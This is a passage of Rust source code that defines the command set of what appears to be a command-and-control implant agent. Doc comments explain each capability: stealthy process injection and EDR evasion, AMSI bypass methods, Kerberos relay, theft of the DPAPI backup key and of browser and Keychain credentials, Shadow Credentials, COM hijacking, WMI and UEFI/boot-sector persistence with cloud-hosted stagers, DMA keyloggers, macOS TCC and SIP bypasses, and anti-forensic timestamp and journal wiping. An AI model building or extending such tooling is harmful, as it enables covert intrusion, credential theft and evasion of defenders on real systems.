    /// temp file, creates a section from the file, rolls back the
    /// transaction (deleting the file from disk), then maps the section
    /// into a suspended process and executes the payload.  No disk
    /// artifacts remain after rollback.
    ///
    /// This is the raw NT-level implementation — it does not go through
    /// the injection engine's technique-selection or fallback chain.
    /// Returns `InjectionResult` on success.
    ProcessDoppelganging {
        /// Process name to use as the sacrificial host (e.g. `"svchost.exe"`).
        /// If `None`, defaults to `svchost.exe`.
        target_process: Option<String>,
        /// Shellcode or PE payload bytes.
        payload: Vec<u8>,
    },

    /// Delayed module-stomp injection: load a sacrificial DLL into the
    /// target process, wait for the EDR initial-scan window to pass,
    /// then overwrite the DLL's `.text` section with the payload.
    /// The delay (8–15 seconds randomized by default) defeats timing-
    /// based EDR heuristics that flag modules whose code changes shortly
    /// after loading.  Phase 1 (load) returns immediately; Phase 2
    /// (stomp + execute) fires after the delay.
    /// Returns a phase-1 acknowledgement immediately, then a second
    /// `InjectionResult` when phase 2 completes.
    DelayedStomp {
        /// Target process ID.
        target_pid: u32,
        /// Shellcode or PE payload bytes.
        payload: Vec<u8>,
        /// Optional override for the delay in seconds (uses config default if `None`).
        delay_secs: Option<u32>,
    },

    /// DLL side-load injection with export forwarding.  Decrypts the payload
    /// (same as `DllSideLoad`), opens the target process, resolves the forward
    /// target DLL in the target process via PEB module walk, allocates memory
    /// for the payload near the forward target, patches the payload's export
    /// table entries to point to the real function addresses, and executes
    /// via `NtCreateThreadEx`.  This produces a side-loaded DLL with a
    /// legitimate export table in memory — a more OPSEC-safe path than
    /// the basic `DllSideLoad` injector.
    InjectSideLoad {
        /// Target process ID.
        pid: u32,
        /// XChaCha20-Poly1305 encrypted payload blob.
        payload: Vec<u8>,
        /// Export forwarding configuration.
        export_config: ExportConfig,
    },

    /// Unified injection via the injection engine.  Supports all 12
    /// technique variants with automatic technique selection, EDR
    /// reconnaissance, and fallback chains.  When `technique` is `None`
    /// the engine auto-selects the stealthiest technique for the target
    /// process.  When `technique` is specified, the engine uses it but
    /// falls back through the ranked technique list on failure.
    ///
    /// The technique string format is one of:
    ///   `"auto"` — auto-select (default)
    ///   `"ProcessHollow"`, `"ModuleStomp"`, `"EarlyBirdApc"`,
    ///   `"ThreadHijack"`, `"FiberInject"`, `"ContextOnly"`,
    ///   `"TransactedHollowing"`, `"DelayedModuleStomp"`,
    ///   `"ThreadPool"` — auto-variant thread pool injection
    ///   `"ThreadPool:Work"`, `"ThreadPool:Timer"`, etc. — specific variant
    ///   `"CallbackInjection"` — auto-API callback injection
    ///   `"CallbackInjection:EnumSystemLocalesA"`, etc. — specific API
    ///   `"SectionMapping"` — section mapping (auto exec method)
    ///   `"SectionMapping:Direct"` — section mapping with specific exec method
    ///   `"WaitingThreadHijack"` — waiting thread hijack
    ///   `"NtSetInfoProcess"` — NtSetInformationProcess write bypass
    ///
    /// Returns `InjectionResult` on success.
    UnifiedInject {
        /// Process name to inject into (e.g. `"svchost.exe"`).
        target_process: String,
        /// Shellcode or PE payload bytes.
        payload: Vec<u8>,
        /// Technique to use. `None` or `"auto"` = auto-select.
        #[serde(default)]
        technique: Option<String>,
        /// If true, use evasion-enhanced path with pre-injection
        /// reconnaissance (ETW check, EDR module detection, timing jitter).
        #[serde(default = "default_true")]
        evade: bool,
    },

    // ── Syscall emulation control (Windows only) ─────────────────────────
    /// Toggle user-mode NT kernel interface emulation at runtime.
    /// When enabled, the agent routes configured Nt* calls through
    /// kernel32/advapi32 equivalents instead of ntdll syscall stubs,
    /// making it invisible to EDR hooks on ntdll.  The change takes
    /// effect immediately for subsequent operations.
    SyscallEmulationToggle {
        /// `true` to enable emulation, `false` to disable (revert to
        /// indirect syscalls for all calls).
        enabled: bool,
    },

    // ── CET / Shadow Stack bypass (Windows only) ─────────────────────────
    /// Query the current CET (Control-flow Enforcement Technology) /
    /// shadow-stack status on the agent host.  Returns a JSON object
    /// describing whether CET is present, enabled, and which bypass
    /// strategy is active.
    CetStatus,

    // ── Token-only impersonation (Windows only) ──────────────────────────
    /// Create a named pipe and impersonate the security context of the
    /// first connecting client using token-only impersonation (avoids
    /// `ImpersonateNamedPipeClient` on the main thread).  The pipe is
    /// created with a randomised suffix if not provided.  Returns the
    /// pipe path and the impersonated user/domain on success.
    ImpersonatePipe {
        /// Named pipe path (e.g. `\\.\pipe\status`).  If empty, a random
        /// pipe name is generated.
        pipe_name: String,
    },
    /// Revert the current thread's impersonation token, restoring the
    /// original process security context.  Does NOT close cached tokens
    /// — call `ListTokens` to inspect and release cached entries.
    RevertToken,
    /// List all cached impersonation tokens with their source, user,
    /// domain, and SID.  Returns a JSON array of token metadata.
    ListTokens,

    // ── Forensic cleanup — Prefetch evidence removal (Windows only) ──────
    /// Clean Windows Prefetch (.pf) evidence for the specified executable
    /// name.  If `exe_name` is empty, cleans all .pf files.  The cleanup
    /// method (delete, patch, disable-service) is determined by config.
    CleanPrefetch {
        /// Executable name to clean (e.g. "cmd.exe").  If empty, all .pf
        /// files are cleaned.
        exe_name: String,
    },
    /// Disable the Windows Prefetch service by setting the EnablePrefetcher
    /// registry value to 0.  Returns the original value for later restore.
    DisablePrefetch,
    /// Restore the Windows Prefetch service to its original state (sets
    /// EnablePrefetcher back to the value captured by `DisablePrefetch`).
    RestorePrefetch,

    /// Synchronise MFT timestamps ($SI + $FN) for the specified file to
    /// match the timestamps of a reference file.  Sets all 8 NTFS
    /// timestamps (4 in $STANDARD_INFORMATION + 4 in $FILE_NAME) to a
    /// consistent "cover time" to prevent forensic timeline analysis.
    Timestomp {
        /// Path to the file whose timestamps should be modified.
        file_path: String,
        /// Path to the reference file whose timestamps to copy.  If empty,
        /// uses the configured default reference file (typically ntdll.dll).
        reference_file: String,
    },
    /// Synchronise MFT timestamps for all files in a directory to match
    /// the timestamps of a reference file.  Recursively processes all
    /// files in the directory tree.
    TimestompDirectory {
        /// Path to the directory whose files should be timestamped.
        dir_path: String,
        /// Path to the reference file whose timestamps to copy.  If empty,
        /// uses the configured default reference file.
        reference_file: String,
    },
    /// Clean USN journal entries for a volume.  Removes entries that
    /// reference file modifications, preventing forensic timeline recovery
    /// of timestamp changes.
    CleanUsn {
        /// Volume path (e.g. "C:").  If empty, operates on the system volume.
        volume: String,
    },
    /// Synchronise timestamps for all recently modified files.  Scans for
    /// files modified within the current session and applies cover
    /// timestamps from the configured reference file.
    SyncTimestamps,

    // ── Sandbox scoring (all platforms) ──────────────────────────────────
    /// Run a comprehensive sandbox/VM detection sweep and return the full
    /// indicator breakdown (category, detail, weight, source) together
    /// with the total score and the threshold used.  This gives operators
    /// a detailed report instead of just a boolean.
    SandboxCheck,

    /// Query the current state of the EDR bypass transform engine.
    /// Returns a structured JSON snapshot including last scan/transform
    /// counts, cumulative totals, skipped counter, and timestamp.
    EdrBypassStatus,

    /// Query the current state of the Evanesco page tracker subsystem.
    /// Returns full telemetry including page counts, timing, and
    /// encrypt/decrypt counters.  Requires operator-level access.
    PageTrackerStatus,

    /// Query a redacted version of page tracker state suitable for
    /// lower-privilege consumers.  Returns only page counts
    /// (total, encrypted, decrypted_rw, decoded_rx) with no timing
    /// data, no counters, and no thresholds.
    PageTrackerStatusRedacted,

    // ── Kerberos relay (Windows-only) ───────────────────────────────
    /// Execute a Kerberos relay attack via COM cross-session activation.
    /// Captures Kerberos service tickets without NTLM by triggering COM
    /// activation against an attacker-controlled service, extracting the
    /// AP-REQ from the RPC bind security trailer, and returning the
    /// captured ticket data.
    ///
    /// Requires admin-level privileges (SeImpersonatePrivilege for COM
    /// activation).  Windows-only, gated by `kerberos-relay` feature flag.
    KerberosRelay {
        /// Target hostname or IP for the COM activation.  When performing
        /// local relay, use `127.0.0.1` or `localhost`.
        target_host: String,
        /// Service Principal Name (SPN) for Kerberos authentication.
        /// Example: `cifs/target.corp.example.com`, `ldap/dc01.corp.example.com`.
        target_spn: String,
        /// Relay method to use for ticket capture.
        #[serde(default)]
        method: KerberosRelayMethod,
        /// Name of the exploitable CLSID to use for COM activation.
        /// Must match one of the entries in the agent's exploitable CLSID
        /// database (e.g. "BITS", "ICertPassage", "TaskService",
        /// "UpdateOrchestrator").
        #[serde(default = "default_kerberos_clsid")]
        clsid: String,
        /// Local address to bind the relay listener on.
        #[serde(default = "default_kerberos_bind_address")]
        bind_address: String,
        /// Local port for the relay listener.
        #[serde(default = "default_kerberos_bind_port")]
        bind_port: u16,
        /// Timeout in seconds to wait for COM activation and ticket capture.
        #[serde(default = "default_kerberos_timeout")]
        timeout_secs: u64,
    },

    /// List available exploitable CLSIDs for Kerberos relay attacks.
    /// Returns a JSON array of CLSID entries with names, GUIDs, and
    /// descriptions.
    KerberosRelayListClsids,

    // ── DPAPI Backup Key (Windows-only) ─────────────────────────────────
    /// Retrieve the domain DPAPI backup key from a Domain Controller using
    /// the MS-BKRP (BackupKey Remote Protocol).  Any domain-authenticated
    /// user can retrieve this key — Domain Admin privileges are NOT required.
    /// The backup key is an RSA private key that can decrypt any DPAPI
    /// master key in the domain.
    ///
    /// **OPSEC**: Does NOT touch LSASS memory.  Uses RPC over named pipe
    /// to the DC's `\pipe\lsarpc`.
    ///
    /// Windows-only, gated by `dpapi-backup` feature flag.
    DpapiBackupKeyRetrieve {
        /// Optional DC hostname.  If not provided, the agent auto-discovers
        /// the domain controller via DsGetDcNameW.
        dc_hostname: Option<String>,
    },

    /// Harvest DPAPI-protected secrets from the target system using a
    /// previously retrieved domain backup key.  Scans Credential Store,
    /// Chrome/Edge cookies and saved passwords, WiFi profiles, and RDP
    /// saved credentials.
    ///
    /// Requires the backup key to have been previously retrieved (via
    /// `DpapiBackupKeyRetrieve`) and stored in the agent's session state.
    ///
    /// Windows-only, gated by `dpapi-backup` feature flag.
    DpapiBackupKeyHarvest {
        /// Domain backup key data (PVK blob, hex-encoded).
        backup_key_hex: String,
        /// Optional DC hostname for auto-discovery fallback.
        #[serde(default)]
        dc_hostname: Option<String>,
    },

    /// Decrypt a single DPAPI blob using the domain backup key.
    /// Useful for targeted decryption of specific secrets.
    ///
    /// Windows-only, gated by `dpapi-backup` feature flag.
    DpapiBackupKeyDecrypt {
        /// DPAPI blob data (hex-encoded).
        blob_hex: String,
        /// Domain backup key data (PVK blob, hex-encoded).
        backup_key_hex: String,
    },

    // ── Shadow Credentials (Windows-only) ──────────────────────────────
    /// Execute the Shadow Credentials attack: add an attacker-controlled
    /// certificate to a target's `msDS-KeyCredentialLink` attribute, then
    /// authenticate as that principal via PKINIT Kerberos with no password
    /// required and no password change logged.
    ///
    /// **Attack flow**:
    /// 1. Resolve target DN from the target name
    /// 2. Check write access to `msDS-KeyCredentialLink`
    /// 3. Generate a self-signed X.509 certificate (RSA-2048)
    /// 4. Build the `msDS-KeyCredentialLink` binary value
    /// 5. Write it to the target object via LDAP
    /// 6. Authenticate as the target via PKINIT
    /// 7. Clean up (remove the credential link)
    ///
    /// **Prerequisites**: Windows Server 2016+ domain functional level,
    /// write access to target's `msDS-KeyCredentialLink`.
    ///
    /// **OPSEC**: Does NOT change the target's password.  Does NOT require
    /// Domain Admin privileges.  Credential link is cleaned up after use.
    ///
    /// Windows-only, gated by `shadow-credentials` feature flag.
    ShadowCredentialsAttack {
        /// Target name (sAMAccountName or distinguished name).
        /// User example: "jdoe".  Computer example: "WORKSTATION01$"
        target: String,
    },

    /// Check if the current user has write access to a target's
    /// `msDS-KeyCredentialLink` attribute.  Returns true/false.
    ///
    /// Windows-only, gated by `shadow-credentials` feature flag.
    ShadowCredentialsCheckAccess {
        /// Target distinguished name.
        target_dn: String,
    },

    /// Generate a self-signed X.509 certificate suitable for the
    /// Shadow Credentials attack.  Returns the private key and
    /// certificate in DER format (hex-encoded).
    ///
    /// Windows-only, gated by `shadow-credentials` feature flag.
    ShadowCredentialsCertGen {
        /// Subject name for the certificate (typically the target UPN).
        subject: String,
    },

    // ── COM Object Hijacking (registry-free, activation context) ─────────
    /// Generate an SxS manifest XML for registry-free COM CLSID redirection.
    ///
    /// The manifest redirects COM resolution for a given CLSID to a proxy DLL
    /// without touching the Windows registry.  When loaded into an activation
    /// context, COM object creation on the thread will resolve to the proxy.
    ///
    /// **OPSEC**: No registry writes — uses Side-by-Side (SxS) activation
    /// contexts, which are thread-local and ephemeral.
    ///
    /// Windows-only, gated by `com-hijack` feature flag.
    ComHijackManifest {
        /// Target CLSID in `{xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx}` format.
        clsid: String,
        /// Absolute or relative path to the proxy DLL.
        proxy_dll_path: String,
        /// Optional ProgID to include in the manifest.
        prog_id: Option<String>,
    },

    /// Create and activate a COM hijack activation context from a manifest file.
    ///
    /// Loads the manifest from disk and activates it on the current thread.
    /// After activation, COM resolution for the target CLSID is redirected
    /// to the proxy DLL specified in the manifest.
    ///
    /// **OPSEC**: The manifest file must exist on disk temporarily.  For
    /// disk-less operation, use `ComHijackActivateMemory`.
    ///
    /// Windows-only, gated by `com-hijack` feature flag.
    ComHijackActivateFile {
        /// Path to the manifest XML file on disk.
        manifest_path: String,
        /// Target CLSID being redirected (for logging).
        clsid: String,
    },

    /// Create and activate a COM hijack activation context from in-memory manifest.
    ///
    /// Writes a temporary file, creates the activation context, then deletes
    /// the file immediately.  The activation context persists in memory.
    ///
    /// **OPSEC**: No persistent disk writes.  Temporary file is deleted
    /// immediately after context creation.
    ///
    /// Windows-only, gated by `com-hijack` feature flag.
    ComHijackActivateMemory {
        /// Complete SxS manifest XML content.
        manifest_xml: String,
        /// Target CLSID being redirected (for logging).
        clsid: String,
    },

    /// Scan for hijackable COM objects.
    ///
    /// Returns a list of COM CLSIDs suitable for registry-free hijacking,
    /// with metadata (ProgID, description, EDR visibility assessment).
    ///
    /// Windows-only, gated by `com-hijack` feature flag.
    ComHijackScanTargets,

    /// Generate a proxy DLL template for COM forwarding.
    ///
    /// Creates a minimal x86-64 PE DLL that exports `DllGetClassObject` and
    /// `DllCanUnloadNow`.  Returns hex-encoded DLL bytes ready for writing
    /// to disk or in-memory loading.
    ///
    /// Windows-only, gated by `com-hijack` feature flag.
    ComHijackProxyDll {
        /// Target CLSID (embedded as metadata in the DLL).
        clsid: String,
        /// Description of the original COM handler being proxied.
        original_handler: String,
    },

    // ── WMI Permanent Subscriptions with Encrypted Cloud Payloads ─────────
    /// Install a WMI permanent event subscription that triggers a cloud-hosted
    /// payload.  Creates the WMI persistence triad (filter, consumer, binding).
    /// The consumer contains only a stager command — no shellcode or encrypted
    /// blobs.  The payload is uploaded to a cloud service (Azure Blob, AWS S3,
    /// or GitHub Gist) and only materializes in memory when triggered.
    ///
    /// Windows-only, gated by `wmi-persistence` feature flag.
    WmiInstallSubscription {
        /// Configuration for the WMI subscription (JSON-serialized).
        config_json: String,
    },

    /// Remove a WMI permanent event subscription by filter and consumer name.
    /// Deletes the binding, consumer, and filter in the correct order.
    ///
    /// Windows-only, gated by `wmi-persistence` feature flag.
    WmiRemoveSubscription {
        /// Name of the __EventFilter to remove.
        filter_name: String,
        /// Name of the event consumer to remove.
        consumer_name: String,
    },

    /// Scan for existing Orchestra WMI subscriptions.
    /// Queries ROOT\subscription for filters and consumers matching our
    /// naming pattern.
    ///
    /// Windows-only, gated by `wmi-persistence` feature flag.
    WmiScanSubscriptions,

    /// Encrypt and upload a shellcode payload to a cloud service.
    /// Returns the upload URL and encryption metadata.  The encrypted blob
    /// can then be referenced by a WMI subscription stager.
    ///
    /// Windows-only, gated by `wmi-persistence` feature flag.
    WmiCloudUpload {
        /// Shellcode payload to encrypt and upload.
        payload: Vec<u8>,
        /// Cloud storage configuration (JSON-serialized).
        cloud_config_json: String,
    },

    /// Generate a PowerShell stager command for a given cloud payload URL
    /// and decryption key.  The stager fetches, decrypts, and executes the
    /// payload entirely in memory.
    ///
    /// Windows-only, gated by `wmi-persistence` feature flag.
    WmiGenerateStager {
        /// URL of the encrypted payload in cloud storage.
        url: String,
        /// Base decryption key (32 bytes, hex-encoded).
        key_hex: String,
    },

    // ── UEFI Firmware-Level Persistence ───────────────────────────────────
    /// Read a UEFI NVRAM variable.
    ///
    /// Cross-platform: uses `/sys/firmware/efi/efivars/` on Linux and
    /// `GetFirmwareEnvironmentVariableW` on Windows.
    UefiReadVariable {
        /// Variable name (e.g., "BootOrder", "SecureBoot").
        name: String,
        /// EFI GUID in standard format (e.g., "8BE4DF61-93CA-11D2-AA0D-00E098032B8C").
        guid: String,
    },

    /// Write a UEFI NVRAM variable.
    ///
    /// **DANGEROUS**: Writing incorrect NVRAM values can brick the firmware.
    UefiWriteVariable {
        /// Variable name.
        name: String,
        /// EFI GUID.
        guid: String,
        /// Variable data (base64-encoded).
        data: String,
        /// EFI variable attributes bitfield.
        attributes: u32,
    },

    /// Enumerate all UEFI boot entries from NVRAM.
    ///
    /// Returns parsed `BootEntry` structures with descriptions, device paths,
    /// and optional data.
    UefiEnumerateBootEntries,

    /// Modify an existing UEFI boot entry's device path.
    ///
    /// Creates a backup of the original entry before modification.
    UefiModifyBootEntry {
        /// Boot entry number (e.g., 0x0001).
        entry_num: u16,
        /// New EFI device path (e.g., `\EFI\Vendor\Driver.efi`).
        new_path: String,
    },

    /// Mount (or locate) the EFI System Partition.
    ///
    /// Returns the mount point path.
    UefiMountEsp,

    /// Write an EFI driver binary to the ESP.
    ///
    /// The driver is placed in `\EFI\<vendor>\<driver_name>.efi`.
    UefiWriteDriver {
        /// Path to the mounted ESP.
        esp_path: String,
        /// Driver filename (without .efi extension).
        driver_name: String,
        /// Driver binary data (base64-encoded).
        driver_data: String,
        /// Vendor directory name (optional, uses blending heuristic if omitted).
        vendor: Option<String>,
    },

    /// Build a minimal EFI application PE/COFF stub with embedded payload.
    ///
    /// Generates a valid PE32+ binary with .text, .rdata, and .reloc sections.
    UefiBuildStub {
        /// Payload data to embed in the .rdata section (base64-encoded).
        payload_data: String,
        /// Path to a second-stage EFI driver on the ESP.
        second_stage_path: String,
        /// Offset within payload to use as entry point.
        entry_point_offset: u32,
        /// Whether to chain-load the original bootloader after the payload.
        chain_to_original: bool,
        /// Path to the original bootloader (for chain-loading).
        original_bootloader_path: String,
    },

    /// Install a runtime DXE driver via NVRAM driver load list or capsule.
    UefiInstallRuntimeDriver {
        /// Driver binary data (base64-encoded).
        driver_data: String,
        /// Driver filename.
        driver_name: String,
        /// Path to the mounted ESP.
        esp_path: String,
        /// Use capsule delivery instead of driver load list.
        use_capsule: bool,
    },

    /// Check firmware capsule update support.
    ///
    /// Reads OsIndicationsSupported to determine available capsule methods.
    UefiCheckCapsuleSupport,

    /// Scan for existing UEFI persistence artifacts.
    ///
    /// Checks boot entries, ESP files, NVRAM variables, and bootloader configs.
    UefiDetectPersistence {
        /// Path to the mounted ESP.
        esp_path: String,
    },

    /// Remove a detected UEFI persistence artifact.
    ///
    /// Creates a backup before removal.
    UefiRemovePersistence {
        /// Artifact type.
        artifact_type: String,
        /// Human-readable description.
        description: String,
        /// Location/path of the artifact.
        path: String,
        /// Risk level (e.g. "info", "low", "medium", "high", "critical").
        risk_level: String,
        /// Whether the artifact can be safely removed.
        removable: bool,
    },

    // ── Anti-Debug Hardening (macOS) ────────────────────────────────────────
    /// Actively deny future debugger attachment on macOS by calling
    /// `ptrace(PT_DENY_ATTACH)`.  This is a non-passive side-effect that
    /// prevents any subsequent debugger from attaching.  On non-macOS
    /// platforms this is a no-op that always succeeds.
    DenyDebuggerAttach,

    // ── macOS Post-Exploitation: TCC ────────────────────────────────────────
    /// Check TCC (Transparency, Consent, and Control) permission status for
    /// the current process on macOS.  Queries the system and user TCC
    /// databases for the specified resource.
    ///
    /// **Resource** is one of: `Camera`, `Microphone`, `ScreenRecording`,
    /// `FullDiskAccess`, `DesktopFolder`, `DocumentsFolder`, `DownloadsFolder`,
    /// `Contacts`, `Calendar`, `Reminders`, `Photos`, `Accessibility`,
    /// `PostEvent`.
    ///
    /// Returns JSON with `resource`, `status` (Allowed/Denied/NotDetermined/
    /// Unknown), and `source` (where the status was read from).
    ///
    /// macOS-only, gated by `macos-postexp` feature flag.
    MacTccCheck {
        /// TCC resource name (e.g. "FullDiskAccess", "Camera").
        resource: String,
    },

    /// Attempt TCC bypass on macOS.  Multiple bypass methods are available:
    ///
    /// - `database` — Write directly to the TCC SQLite database (requires
    ///   root + SIP disabled).
    /// - `synthetic_click` — Generate synthetic mouse clicks on the TCC
    ///   permission dialog (requires Accessibility permission).
    /// - `vulnerable_process` — Exploit a process that already has the
    ///   required TCC permission.
    /// - `all` — Try all methods in order and return the first success.
    ///
    /// Returns JSON with `success`, `technique`, and `message`.
    ///
    /// macOS-only, gated by `macos-postexp` feature flag.
    MacTccBypass {
        /// TCC resource name (e.g. "FullDiskAccess", "Camera").
        resource: String,
        /// Bypass method: "database", "synthetic_click", "vulnerable_process",
        /// or "all".
        method: String,
    },

    // ── macOS Post-Exploitation: SIP ────────────────────────────────────────
    /// Check System Integrity Protection (SIP) status on macOS.
    /// Returns JSON with `status` (Enabled/Disabled/PartiallyDisabled/Unknown),
    /// `csrutil_output`, and `nvram_config`.
    ///
    /// macOS-only, gated by `macos-postexp` feature flag.
    MacSipStatus,

    /// Attempt SIP bypass via mount on macOS.  Mounts a synthetic filesystem
    /// over a protected path to bypass SIP file restrictions.  Requires root.
    ///
    /// Returns `true` on success.
    ///
    /// macOS-only, gated by `macos-postexp` feature flag.
    MacSipBypassMount,

    // ── macOS Post-Exploitation: XPC ────────────────────────────────────────
    /// Enumerate XPC services on macOS that may be exploitable for privilege
    /// escalation.  Returns a JSON array of service objects with `name`,
    /// `mach_service_name`, `executable_path`, `bundle_path`, and `is_privileged`.
    ///
    /// macOS-only, gated by `macos-postexp` feature flag.
    MacXpcEnumerate,

    /// Attempt XPC-based privilege escalation on macOS by connecting to a
    /// privileged XPC service and sending a crafted message.
    ///
    /// Returns JSON with `service_name`, `success`, `technique`, and `message`.
    ///
    /// macOS-only, gated by `macos-postexp` feature flag.
    MacXpcExploit {
        /// XPC service name to target (from `MacXpcEnumerate` results).
        service_name: String,
    },

    // ── macOS Post-Exploitation: Keychain ────────────────────────────────────
    /// Dump macOS Keychain entries using the `security` CLI.
    /// Returns a JSON array of keychain entries with `service`, `account`,
    /// `password` (if accessible), `entry_type`, `label`, and dates.
    ///
    /// **Requirements**: Full Disk Access or unlocked Keychain.  Root can
    /// access the system Keychain without additional permissions.
    ///
    /// macOS-only, gated by `macos-postexp` feature flag.
    MacKeychainDump,

    // ── Hardware Persistence: Thunderbolt / DMA ─────────────────────────────
    /// Detect Thunderbolt controller on the host.  Returns `null` if no
    /// controller found, otherwise JSON with `generation`, `security_level`,
    /// `firmware_version`, and `domains` information.
    ///
    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
    /// feature flag.
    HwDetectThunderbolt,

    /// Check DMA (Direct Memory Access) vulnerability on the host.  Probes
    /// Thunderbolt security configuration, IOMMU/VT-d status, and known
    /// vulnerable controller firmware.
    ///
    /// Returns JSON with `vulnerable` (bool), `factors` (array of contributing
    /// factors), `attack_vectors` (array of available attack vectors), and
    /// `risk_score` (0–100).
    ///
    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
    /// feature flag.
    HwCheckDmaVulnerability,

    /// Prepare a DMA payload for Thunderbolt-based attacks.  Generates a
    /// binary payload that can be loaded onto a DMA-capable device (e.g.,
    /// PCILeech-compatible hardware).
    ///
    /// **Payload types**: `PhysRead` (physical memory read), `PhysWrite`
    /// (physical memory write), `Kexec` (kernel code execution), `Keylogger`
    /// (keystroke capture via DMA).
    ///
    /// Returns JSON with base64-encoded `payload_data`, `architecture`,
    /// `payload_type`, and `size_bytes`.
    ///
    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
    /// feature flag.
    HwPrepareDmaPayload {
        /// Payload type: "PhysRead", "PhysWrite", "Kexec", or "Keylogger".
        payload_type: String,
    },

    /// Read physical memory via DMA at the specified address.
    /// Requires a DMA-capable device or BYOVD driver.
    ///
    /// Returns base64-encoded bytes read from physical memory.
    ///
    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
    /// feature flag.
    HwDmaReadPhysical {
        /// Physical memory address to read from.
        addr: u64,
        /// Number of bytes to read.
        size: u32,
    },

    // ── Hardware Persistence: Boot ──────────────────────────────────────────
    /// Check whether the system boots via Legacy BIOS or UEFI mode.
    /// Returns JSON with `mode` ("Uefi" or "LegacyBios"), `secure_boot`
    /// status (UEFI only), and `description`.
    ///
    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
    /// feature flag.
    HwBootMode,

    /// Install VBR (Volume Boot Record) persistence for Legacy BIOS systems.
    /// Writes a payload to the boot sector that executes before the OS loads.
    ///
    /// **DANGEROUS**: Can brick the system if the payload is incorrect.
    /// A backup of the original boot sector is created before modification.
    ///
    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
    /// feature flag.
    HwInstallVbrPersistence {
        /// Path to the payload binary to install in the boot sector.
        payload_path: String,
    },

    /// Install UEFI boot driver persistence.  Writes an EFI driver to the
    /// ESP and registers it in the UEFI boot sequence.
    ///
    /// **DANGEROUS**: Writing incorrect EFI drivers can brick the firmware.
    /// A backup is created before modification.
    ///
    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
    /// feature flag.
    HwInstallUefiBootPersistence {
        /// Path to the EFI driver binary to install.
        driver_path: String,
    },

    /// Detect existing hardware-level persistence artifacts on the system.
    /// Scans boot sectors, ESP files, NVRAM variables, and bootloader
    /// configurations for signs of compromise.
    ///
    /// Returns a JSON array of detected artifacts with `artifact_type`,
    /// `description`, `path`, `risk_level`, and `removable` fields.
    ///
    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
    /// feature flag.
    HwDetectPersistence,

    /// Remove a detected hardware persistence artifact.
    /// Creates a backup before removal.
    ///
    /// Cross-platform (Linux and Windows), gated by `hardware-persistence`
    /// feature flag.
    HwRemovePersistence {
        /// Artifact type (e.g. "VbrModification", "EfiBootEntry", "UnsignedUefiDriver").
        artifact_type: String,
        /// Human-readable description.
        description: String,
        /// Location of the artifact (path, LBA, or NVRAM entry).
        location: String,
        /// Whether the artifact can be safely removed.
        removable: bool,
    },
}

/// Kerberos relay method selector.
///
/// Controls how the agent captures and forwards Kerberos tickets during
/// the relay attack.  Each method has different OPSEC tradeoffs:
///
/// - **ComActivation**: Trigger COM cross-session activation with a custom
///   COSERVERINFO to force Kerberos authentication.  Most reliable for
///   capturing tickets from local SERVICE accounts.
/// - **LdapRelay**: Relay the captured Kerberos ticket to an LDAP server
///   for enumeration or modification (e.g. DsWriteAccountSpn).
/// - **RpcBind**: Capture the ticket from a raw RPC bind request without
///   COM activation infrastructure.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
#[derive(Default)]
pub enum KerberosRelayMethod {
    /// COM cross-session activation (CoCreateInstanceEx).
    #[default]
    ComActivation,
    /// Relay captured ticket to LDAP for AD operations.
    LdapRelay,
    /// Raw RPC bind ticket capture.
    RpcBind,
}

fn default_kerberos_clsid() -> String {
    "BITS".to_string()
}

fn default_kerberos_bind_address() -> String {
    "127.0.0.1".to_string()
}

fn default_kerberos_bind_port() -> u16 {
    0
}

fn default_kerberos_timeout() -> u64 {
    30
}

/// AMSI bypass strategy selector.
///
/// Controls which bypass technique the agent uses to neutralise Anti-Malware
/// Scan Interface scanning.  Each strategy has different OPSEC tradeoffs:
///
/// - **WriteRaid**: Data-only race condition — overwrites the AMSI init-failed
///   flag in `.data` so all subsequent scans return `AMSI_RESULT_CLEAN`.
///   No code patches, no hardware breakpoints, no `VirtualProtect` calls.
///   **Most stealthy**; preferred when available.
/// - **Hwbp**: Hardware breakpoint on `AmsiScanBuffer` via DR0/DR1 + VEH.
///   No `.text` modification, but breakpoint registers are monitorable.
/// - **MemoryPatch**: In-process code patch (`xor eax,eax; ret`).  Detectable
///   via code integrity checks and `VirtualProtect` hooks.
/// - **Auto**: Select the best available strategy (WriteRaid > Hwbp > MemoryPatch).
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum AmsiBypassMode {
    /// Hardware-breakpoint bypass via DR0/DR1 + VEH handler.
    Hwbp,
    /// In-process code patching of AmsiScanBuffer.
    MemoryPatch,
    /// Data-only race condition: overwrite AmsiInitFailed flag.
    WriteRaid,
    /// Automatically select the best available strategy.
    Auto,
}

/// Browser selector for the [`Command::BrowserData`] command.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BrowserType {
    Chrome,
    Edge,
    Firefox,
    All,
}

/// Data category selector for the [`Command::BrowserData`] command.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum BrowserDataType {
    Credentials,
    Cookies,
    All,
}

/// LSA Whisperer method selector.
///
/// Controls how the LSA Whisperer extracts credentials from LSA authentication
/// packages.  Each method has different privilege requirements and OPSEC profiles:
///
/// - **Untrusted**: Uses `LsaConnectUntrusted` + `LsaCallAuthenticationPackage`
///   to query already-loaded SSPs (MSV1_0, Kerberos, WDigest).  No admin
///   privileges required — any process can connect to LSA.
/// - **SspInject**: Adds a custom SSP via registry that receives ALL
///   authentication events, including plaintext passwords during future logons.
///   Requires admin privileges.  Credentials are buffered in an encrypted ring.
/// - **Auto**: Try `SspInject` if the agent is elevated (or has a SYSTEM token),
///   else fall back to `Untrusted`.
#[derive(Debug, Clone, PartialEq, Serialize, Deserialize)]
#[serde(rename_all = "snake_case")]
pub enum LsaMethod {
    /// Query already-loaded SSPs via LsaConnectUntrusted (no admin required).
    Untrusted,
    /// Inject a custom SSP to capture future authentication events (admin).
    SspInject,
    /// Automatically select the best available method.
    Auto,
}

/// Network discovery operation selector.
///
/// Each variant maps to a function in the `net_discovery` module and carries
